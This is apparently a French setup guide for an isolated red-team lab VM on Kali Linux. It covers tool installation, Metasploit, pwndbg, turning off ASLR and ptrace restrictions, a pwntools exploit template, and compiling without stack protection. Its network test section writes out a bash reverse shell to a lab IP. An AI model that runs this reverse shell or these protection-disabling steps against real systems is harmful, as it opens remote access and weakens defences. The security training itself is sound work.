# Setup VM Linux pour Lab Red Team

## Vue d'ensemble

VM Linux pour développement malware, exploitation et tests.

## Configuration recommandée

**Specs**:
- CPU: 2 cores
- RAM: 4 GB
- Disque: 40 GB
- Réseau: Host-only

**Distribution recommandée**: Kali Linux, Ubuntu 22.04, ou Debian 12

## Installation Kali Linux

```bash
# Télécharger ISO
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso

# Créer VM VirtualBox
VBoxManage createvm --name "Kali-Lab" --ostype Debian_64 --register
VBoxManage modifyvm "Kali-Lab" --memory 4096 --cpus 2
VBoxManage createhd --filename ~/VMs/Kali-Lab.vdi --size 40000
VBoxManage storagectl "Kali-Lab" --name "SATA" --add sata
VBoxManage storageattach "Kali-Lab" --storagectl "SATA" --port 0 --device 0 --type hdd --medium ~/VMs/Kali-Lab.vdi
VBoxManage storageattach "Kali-Lab" --storagectl "SATA" --port 1 --device 0 --type dvddrive --medium ~/Downloads/kali-linux-*.iso
VBoxManage modifyvm "Kali-Lab" --nic1 hostonly --hostonlyadapter1 vboxnet0
VBoxManage startvm "Kali-Lab"
```

## Configuration post-installation

### Update système
```bash
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y
```

### Outils de compilation
```bash
# GCC, build tools
sudo apt install -y build-essential gcc g++ make cmake
sudo apt install -y nasm yasm
sudo apt install -y gdb gdb-multiarch

# Cross-compilation
sudo apt install -y gcc-mingw-w64 gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu
```

### Debuggers et analysis
```bash
# GDB avec extensions
sudo apt install -y gdb gdb-multiarch
pip3 install pwndbg  # ou gef

# Radare2
sudo apt install -y radare2

# Binary Ninja (demo)
# wget https://binary.ninja/demo/ -O binaryninja.zip

# Ghidra
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip
unzip ghidra_*.zip -d ~/tools/
```

### Pwntools et Python
```bash
pip3 install pwntools
pip3 install capstone keystone-engine unicorn ropper
pip3 install pefile lief
```

### Metasploit Framework
```bash
# Déjà installé sur Kali
# Sinon:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Réseau et exploitation
```bash
sudo apt install -y netcat-openbsd socat nmap wireshark
sudo apt install -y exploitdb sqlmap
```

### Forensics
```bash
sudo apt install -y binwalk foremost volatility3
sudo apt install -y strace ltrace
```

## Structure lab

```bash
mkdir -p ~/lab/{src,bin,payloads,exploits,logs,targets}

cat << 'EOF' >> ~/.bashrc

# Lab aliases
alias lab='cd ~/lab'
alias compile='gcc -o bin/$(basename $1 .c) $1'
alias compile32='gcc -m32 -o bin/$(basename $1 .c) $1'
alias compilewin='x86_64-w64-mingw32-gcc -o bin/$(basename $1 .c).exe $1'
EOF

source ~/.bashrc
```

## GDB configuration (pwndbg)

```bash
# Installer pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Configuration ~/.gdbinit
cat << 'EOF' > ~/.gdbinit
source ~/pwndbg/gdbinit.py
set disassembly-flavor intel
set pagination off
EOF
```

## Kernel configuration (pour exploitation)

```bash
# Désactiver ASLR (temporaire)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Permanent (via sysctl)
echo "kernel.randomize_va_space = 0" | sudo tee -a /etc/sysctl.conf

# Autoriser ptrace
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

# Core dumps
ulimit -c unlimited
echo "core" | sudo tee /proc/sys/kernel/core_pattern
```

## Réseau lab

### Host-only
```bash
# VM IP: 192.168.56.20 (statique)
sudo nano /etc/network/interfaces

# Ajouter:
auto eth0
iface eth0 inet static
    address 192.168.56.20
    netmask 255.255.255.0
    gateway 192.168.56.1

sudo systemctl restart networking
```

### Test réseau
```bash
# Listener
nc -lvnp 4444

# Reverse shell depuis cible
bash -i >& /dev/tcp/192.168.56.20/4444 0>&1
```

## Snapshots

```bash
# Créer snapshot
VBoxManage snapshot "Kali-Lab" take "Fresh-Install"

# Restaurer
VBoxManage snapshot "Kali-Lab" restore "Fresh-Install"
```

## Scripts utiles

### exploit_template.sh
```bash
#!/bin/bash
# ~/lab/exploit_template.sh

cat << 'EOF' > exploit.py
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# p = process('./vulnerable')
p = remote('target', 1337)

payload = b'A' * 100
p.sendline(payload)
p.interactive()
EOF

chmod +x exploit.py
```

### compile_all.sh
```bash
#!/bin/bash
# ~/lab/compile_all.sh

for src in src/*.c; do
    name=$(basename "$src" .c)
    echo "[*] Compiling $name..."
    gcc "$src" -o "bin/$name" -no-pie -fno-stack-protector
done
```

## Checklist

- [ ] GCC installé
- [ ] Cross-compilers installés
- [ ] GDB + pwndbg configuré
- [ ] ASLR désactivé
- [ ] ptrace autorisé
- [ ] Réseau isolé configuré
- [ ] Snapshot initial créé
